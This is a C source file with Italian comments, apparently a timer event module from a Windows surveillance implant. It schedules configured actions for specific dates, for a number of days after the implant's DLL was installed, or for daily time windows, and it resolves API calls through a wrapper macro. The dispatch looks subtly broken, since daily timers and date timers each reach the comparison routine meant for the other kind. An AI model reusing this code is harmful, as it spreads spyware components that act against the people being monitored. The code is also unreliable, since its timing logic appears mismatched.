#include <Windows.h>
#include <json/JSON.h>
#include "../common.h"
#include "../bss.h"
#include "../H4-DLL.h"
#include "../SM_Core.h"
#include "../HM_SafeProcedures.h"
#include "../process.h"
#include "../AM_Core.h"
#include "../LOG.h"
#include "../SM_EventHandlers.h"

//---------------------------------------------------
// TIMER EVENT MONITOR

#define EM_TIMER_DATE 2	 // Attende una determinata data (DWORD64 100-nanosec da 1 gennaio 1601)
#define EM_TIMER_INST 3  // Attende un determinato intervallo (DWORD64 100-nanosec) dalla data di creazione del file
#define EM_TIMER_DAIL 4  // Azione di start dopo n millisecondi dalla mezzanotte (ogni giorno). Stessa cosa per azione di stop

#define EM_TM_SLEEPTIME 500

// C'e' un signolo thread per i timer DATE, INST e DAIL
// Le date (data e installazione) sono GMT.

typedef struct {
	DWORD event_id;
	DWORD lo_delay_start; // Parte alta e bassa dei 100 nanosecondi dall'installazione, o di una data. Ma anche millisecondi dalla mezzanotte
	DWORD hi_delay_start;
	DWORD lo_delay_stop;
	DWORD hi_delay_stop;
	BYTE  timer_type;
	EVENT_PARAM event_param;
	BOOL triggered;
} MONITORED_TIMER;

static DWORD em_tm_timer_count = 0;
static HANDLE em_tm_montime_thread = 0;
static MONITORED_TIMER* em_tm_timer_table = NULL;

static BOOL em_tm_cp = FALSE;

// ritorna la data (100-nanosec dal 1601) di creazione di "filename"
// XXX Attenzione a come il file viene aperto (dovrei aggiungere FILE_SHARE_WRITE)
static BOOL GetFileDate(char* filename, NANOSEC_TIME* time)
{
	HANDLE fileh;
	FILETIME filetime;

	// XXX Attenzione a come il file viene aperto (dovrei aggiungere FILE_SHARE_WRITE)
	fileh = FNC(CreateFileA)(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

	if (fileh == INVALID_HANDLE_VALUE)
		return FALSE;

	if (!FNC(GetFileTime)(fileh, &filetime, NULL, NULL)) {
		CloseHandle(fileh);
		return FALSE;
	}

	time->hi_delay = filetime.dwHighDateTime;
	time->lo_delay = filetime.dwLowDateTime;

	CloseHandle(fileh);
	return TRUE;
}

// Ritorna TRUE se la prima data e' maggiore della seconda (in 100-nanosec)
BOOL IsGreaterDate(NANOSEC_TIME* date, NANOSEC_TIME* dead_line)
{
	// Controlla prima la parte alta
	if (date->hi_delay > dead_line->hi_delay)
		return TRUE;

	if (date->hi_delay < dead_line->hi_delay)
		return FALSE;

	// Se arriva qui vuol dire che la parte alta e' uguale
	// allora controlla la parte bassa
	if (date->lo_delay > dead_line->lo_delay)
		return TRUE;

	return FALSE;
}

// Aggiunge alla data un delay in 100-nanosec.
// Il risultato viene messo nel primo parametro.
void AddNanosecTime(NANOSEC_TIME* time_date, NANOSEC_TIME* time_delay)
{
	DWORD partial_sum;

	time_date->hi_delay += time_delay->hi_delay;
	partial_sum = time_date->lo_delay + time_delay->lo_delay;

	// controlla se c'e' stato un riporto
	if (partial_sum < time_date->lo_delay)
		time_date->hi_delay++;

	time_date->lo_delay = partial_sum;
}

static void TimerDate(MONITORED_TIMER *evt, NANOSEC_TIME* local_time)
{
	FILETIME ft;
	SYSTEMTIME st;

	ft.dwLowDateTime = local_time->lo_delay;
	ft.dwHighDateTime = local_time->hi_delay;
	if (FileTimeToSystemTime(&ft, &st)) {
		DWORD ms_from_midnight = ((((st.wHour * 60) + st.wMinute) * 60) + st.wSecond) * 1000;
		// Se non era triggerato e entriamo nella fascia
		if (!evt->triggered && ms_from_midnight <= evt->lo_delay_stop && ms_from_midnight >= evt->lo_delay_start) {
			evt->triggered = TRUE;
			TriggerEvent(evt->event_param.start_action, evt->event_id);
			CreateRepeatThread(evt->event_id, evt->event_param.repeat_action, evt->event_param.count, evt->event_param.delay);
		}

		// Se era triggerato e ora siamo fuori dalla fascia
		if (evt->triggered && (ms_from_midnight > evt->lo_delay_stop || ms_from_midnight < evt->lo_delay_start)) {
			evt->triggered = FALSE;
			StopRepeatThread(evt->event_id);
			TriggerEvent(evt->event_param.stop_action, evt->event_id);
		}
	}

}

static void TimerDaily(MONITORED_TIMER* evt, NANOSEC_TIME* local_time)
{
	NANOSEC_TIME event_time_start, event_time_stop;
	event_time_start.lo_delay = evt->lo_delay_start;
	event_time_start.hi_delay = evt->hi_delay_start;
	event_time_stop.lo_delay = evt->lo_delay_stop;
	event_time_stop.hi_delay = evt->hi_delay_stop;

	if (!evt->triggered && IsGreaterDate(local_time, &event_time_start) && !IsGreaterDate(local_time, &event_time_stop)) {
		evt->triggered = TRUE;
		TriggerEvent(evt->event_param.start_action, evt->event_id);
		CreateRepeatThread(evt->event_id, evt->event_param.repeat_action, evt->event_param.count, evt->event_param.delay);
	}
	else if (evt->triggered && (!IsGreaterDate(local_time, &event_time_start) || IsGreaterDate(local_time, &event_time_stop))) {
		evt->triggered = FALSE;
		StopRepeatThread(evt->event_id);
		TriggerEvent(evt->event_param.stop_action, evt->event_id);
	}
}

// Thread per le date
DWORD TimerMonitorDates(DWORD dummy)
{
	DWORD i;
	NANOSEC_TIME local_time;

	LOOP{
		CANCELLATION_POINT(em_tm_cp);
		Sleep(EM_TM_SLEEPTIME);

		// Legge la data attuale (in 100-nanosec)...
		if (!HM_GetDate(&local_time))
			continue;

		// Aggiusta la data letta con il delta contenuto nel file di
		// configurazione.
		AddNanosecTime(&local_time, &date_delta);

		// ...e la confronta con tutte quelle da monitorare
		for (i = 0; i < em_tm_timer_count; i++) {
			// Se e' del tipo "fascia oraria" vede se ci siamo dentro o se ne siamo usciti
			switch (em_tm_timer_table[i].timer_type) {
			case EM_TIMER_DAIL: TimerDaily(&em_tm_timer_table[i], &local_time); break;
			case EM_TIMER_DATE:
			case EM_TIMER_INST: TimerDate(&em_tm_timer_table[i], &local_time); break;
			default:
				break;
			}
		}
	}

	return 0;
}

void WINAPI EM_TimerStart()
{
	DWORD dummy;
	// Lancia il thread se c'e' almeno un timer da seguire
	if (em_tm_timer_count > 0)
		em_tm_montime_thread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TimerMonitorDates, NULL, 0, &dummy);
}


void WINAPI EM_TimerStop()
{
	// Cancella il thread 
	QUERY_CANCELLATION(em_tm_montime_thread, em_tm_cp);

	// Cancella tutti i thread di repeat
	for (DWORD i = 0; i < em_tm_timer_count; i++)
		StopRepeatThread(em_tm_timer_table[i].event_id);

	SAFE_FREE(em_tm_timer_table);
	em_tm_timer_count = 0;
}

void WINAPI EM_TimerAdd(JSONObject conf_json, EVENT_PARAM* event_param, DWORD event_id)
{
	DWORD timer_type;
	void* temp_table;
	NANOSEC_TIME install_time;
	char dll_path[DLLNAMELEN];

	// Riconosce il tipo di timer, dato che la funzione si registra su 3 timer diversi
	if (!wcscmp(conf_json[L"event"]->AsString().c_str(), L"timer")) {
		timer_type = EM_TIMER_DAIL;
	}
	else if (!wcscmp(conf_json[L"event"]->AsString().c_str(), L"afterinst")) {
		timer_type = EM_TIMER_INST;
	}
	else {
		timer_type = EM_TIMER_DATE;
	}

	// XXX...altro piccolo ed improbabile int overflow....
	if (!(temp_table = realloc(em_tm_timer_table, (em_tm_timer_count + 1) * sizeof(MONITORED_TIMER))))
		return;

	em_tm_timer_table = (MONITORED_TIMER*)temp_table;
	em_tm_timer_table[em_tm_timer_count].event_id = event_id;
	memcpy(&em_tm_timer_table[em_tm_timer_count].event_param, event_param, sizeof(EVENT_PARAM));
	em_tm_timer_table[em_tm_timer_count].triggered = FALSE;
	em_tm_timer_table[em_tm_timer_count].timer_type = timer_type;

	if (timer_type == EM_TIMER_INST) {
		if (GetFileDate(HM_CompletePath(shared.H4DLLNAME, dll_path), &install_time)) {
			NANOSEC_TIME install_delay;
			DWORD day_after;
			INT64 nanosec;
			// Trasforma da giorni a 100-nanosecondi
			day_after = conf_json[L"days"]->AsNumber();
			nanosec = day_after;
			nanosec = nanosec * 24 * 60 * 60 * 10 * 1000 * 1000;

			install_delay.lo_delay = (DWORD)nanosec;
			install_delay.hi_delay = (DWORD)(nanosec >> 32);

			// Aggiunge al delay la data di installazione
			AddNanosecTime(&install_delay, &install_time);

			// Effettua anche la correzione col delta data
			AddNanosecTime(&install_delay, &date_delta);

			// Il risultato e' la data (in 100-nanosec) da attendere
			em_tm_timer_table[em_tm_timer_count].lo_delay_start = install_delay.lo_delay;
			em_tm_timer_table[em_tm_timer_count].hi_delay_start = install_delay.hi_delay;
			em_tm_timer_table[em_tm_timer_count].lo_delay_stop = 0xffffffff;
			em_tm_timer_table[em_tm_timer_count].hi_delay_stop = 0xffffffff;
		}
		else {
			// Se non riesce a leggere la data di installazione setta l'attesa di 
			// una data che non arrivera' mai...
			em_tm_timer_table[em_tm_timer_count].lo_delay_start = 0xffffffff;
			em_tm_timer_table[em_tm_timer_count].hi_delay_start = 0xffffffff;
			em_tm_timer_table[em_tm_timer_count].lo_delay_stop = 0xffffffff;
			em_tm_timer_table[em_tm_timer_count].hi_delay_stop = 0xffffffff;
		}
	}
	else if (timer_type == EM_TIMER_DAIL) {
		HM_HourStringToMillisecond(conf_json[L"ts"]->AsString().c_str(), &(em_tm_timer_table[em_tm_timer_count].lo_delay_start));
		HM_HourStringToMillisecond(conf_json[L"te"]->AsString().c_str(), &(em_tm_timer_table[em_tm_timer_count].lo_delay_stop));
	}
	else { // Tipo Date
		FILETIME ftime;
		if (conf_json[L"datefrom"]) {
			HM_TimeStringToFileTime(conf_json[L"datefrom"]->AsString().c_str(), &ftime);
			em_tm_timer_table[em_tm_timer_count].lo_delay_start = ftime.dwLowDateTime;
			em_tm_timer_table[em_tm_timer_count].hi_delay_start = ftime.dwHighDateTime;
		}
		else {
			em_tm_timer_table[em_tm_timer_count].lo_delay_start = 0;
			em_tm_timer_table[em_tm_timer_count].hi_delay_start = 0;
		}
		if (conf_json[L"dateto"]) {
			HM_TimeStringToFileTime(conf_json[L"dateto"]->AsString().c_str(), &ftime);
			em_tm_timer_table[em_tm_timer_count].lo_delay_stop = ftime.dwLowDateTime;
			em_tm_timer_table[em_tm_timer_count].hi_delay_stop = ftime.dwHighDateTime;
		}
		else {
			em_tm_timer_table[em_tm_timer_count].lo_delay_stop = 0xffffffff;
			em_tm_timer_table[em_tm_timer_count].hi_delay_stop = 0xffffffff;
		}
	}

	em_tm_timer_count++;
}
